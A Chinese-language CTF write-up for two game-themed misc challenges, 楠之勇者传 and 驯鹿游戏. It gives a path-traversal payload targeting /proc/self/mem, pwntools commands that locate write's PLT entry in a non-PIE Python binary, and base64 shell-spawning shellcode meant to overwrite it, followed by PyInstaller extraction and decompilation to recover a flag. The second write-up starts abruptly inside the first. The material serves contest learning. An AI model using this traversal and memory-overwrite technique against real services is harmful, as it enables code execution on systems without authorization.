# 春秋杯冬季赛游戏类misc题解析：《楠之勇者传》、《驯鹿游戏》

> 原文: https://www.ctfiot.com/89111.html
> ID: 89111

楠之勇者传

制作想法

最近玩的游戏较多，很想能制作一个简单的游戏供大家探索。最后采用了文字游戏的形式，但由于阳耽误了剧本进度，最后呈现出的剧情、关卡相对很少，简化了不少。

制作题目与制作游戏本身就有所冲突，如何埋下题目考点，不至于特别的生硬，以及在文字游戏里能玩的考点不多，最后抱着能让大家学习点东西的目的，设计了一个trick。

如果大家对此类游戏有更多的考点想法，欢迎私聊我。

信息收集

下发容器后，nc连接进去，输入姓名，选择职业后，就展示了地图，有5个选择项。

选择1：新手村 

展示个人信息（每次游戏初始化能力值都是随机的），最关键是可以查看装备介绍。

神秘之戒所记录的字符串为题目环境的操作系统信息(ubuntu 18.04)、python版本(python 3.6.9)

选择2：勇者峡谷

记事录里的操作：

输入文件名、页数(?)、内容

选择3：魔法师公会

可购买新装备

基础魔杖可以“基础64”魔法来记录文字

选择4：历练岛

尝试几次后发现就是随机得到金币和失去血量，并且血量≤0就gg

选择5：提示大厅

提示1为flag在/flag，ctf题常见做法

提示2是展示关键代码，如果觉得自己可以探索发现可以跳过。

探索发现

简单信息收集后，发现这个游戏世界很小，能做的操作很少。去历练岛历练几次赚取15枚金币，到魔法师公会购买基础魔杖，再去勇者峡谷记录就会出现不一样的文字。

这里猜测基础魔杖的基础64魔法，就是ctf里常用的base64编码，可以在记录时以base64编码写入，写内容时再自动解码。

依靠一名游戏玩家&ctfer的直觉，盲猜解题突破口就在此，且猜测页数是文件写入时的偏移量。

（如果观看了提示大厅的提示2，就会发现确实如此。）

解题过程

记事录的文件名可以随便写，内容也可以随便写，甚至可以编码写入，但普通的写入文件又不能助我们拿到/flag文件内容，且写入文件又不能执行，更何况本题也给我们不展示写入后的内容。

题目中在写入文件使用seek操作，我们可以尝试向/proc/self/mem文件写入编码后的shellcode，结合ubuntu:18.04上默认安装的python就是3.6.9，并且python是没有开PIE（基地址不改变），我们就可以直接通过向write的plt表里面写shellcode。

/proc/[pid]/mem

This file can be used to access the pages of a process’s memory through open, read, and lseek.

解题过程

# 目录穿越漏洞
../../../../../../../proc/self/mem

# 使用pwntools获取plt
# 推荐python版本3.8以上
# python3.6复制于容器
>>> from pwn import *
>>> elf = ELF('python3.6')
[*] '/tmp/p/python3.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
>>> elf.plt['write']
4327552

# 使用pwntools得到shellcode
>>> from pwn import *
>>> from base64 import *
>>> context.arch='amd64'
>>> b64encode(asm(shellcraft.sh()))
b'amhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8F'

使用PyInstaller Extractor提取

打开PYZ-00.pyz_extracted文件夹，任找一个pyc文件，看下二进制，看前列头对比下，发现550d0d0a 00000000 00000000开头，python版本为python3.8

返回找reindeer文件，在其头部加上550d0d0a 00000000 00000000 00000000保存，并将文件重命名为reindeer.pyc (新版本的pyinstaller extractor会自动处理好这步)

使用uncompyle6对pyc文件进行反编译

在reindeer.py找到
from astar import astar, getczekolada然后getczekolada()就返回flag

+ + + + + + + + + + +

春秋GAME伽玛实验室

会定期分享赛题赛制设计、解题思路……

如果你日常有一些技术研究和好的设计思路

或在赛后对某道题有另辟蹊径的想法

欢迎找到春秋GAME投稿哦～

联系vx:
cium0309

欢迎加入 春秋GAME CTF交流2群

Q群:
703460426


```
# 目录穿越漏洞
../../../../../../../proc/self/mem
# 使用pwntools获取plt
# 推荐python版本3.8以上
# python3.6复制于容器
>>> from pwn import *
>>> elf = ELF('python3.6')
[*] '/tmp/p/python3.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
>>> elf.plt['write']
4327552
# 使用pwntools得到shellcode
>>> from pwn import *
>>> from base64 import *
>>> context.arch='amd64'
>>> b64encode(asm(shellcraft.sh()))
b'amhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8F'
python pyinstxtractor.py reindeer.exe
uncompyle6 -o reindeer.py reindeer.pyc
def getczekolada():
    data = b'x1fx8bx08x00xd6x03xa0cx02xffKxcbILxafxb60J4JLN2xd3xb5xb400xd65xb14x06xb2x8cRx92txd3x0cMx8crS,rx92xcdRx0ckx01xc7Y,xef*x00x00x00'
    return gzip.decompress(data).decode('utf8')
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/5-1672379358.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/3-1672379359.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/10-1672379359.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/1-1672379359.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/5-1672379360.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/1-1672379360.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/1-1672379360.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/0-1672379360.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/3-1672379360.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/8-1672379361.png)